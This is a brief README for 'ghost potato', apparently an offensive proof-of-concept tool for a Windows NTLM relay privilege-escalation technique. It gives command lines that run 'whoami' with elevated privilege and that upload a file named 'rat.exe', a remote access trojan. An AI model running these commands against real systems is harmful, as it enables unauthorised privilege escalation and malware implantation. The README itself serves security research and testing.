# ghost potato

Writeup: https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html

## Requirements
These tools require [impacket](https://github.com/SecureAuthCorp/impacket). You can install it from pip
```
pip install impacket
```

## Usage
### example:
Get high privilege
```
python ghost.py -smb2support -of out -c whoami
```

Just low privilege:
```
python ghost.py -smb2support -of out --upload rat.exe
```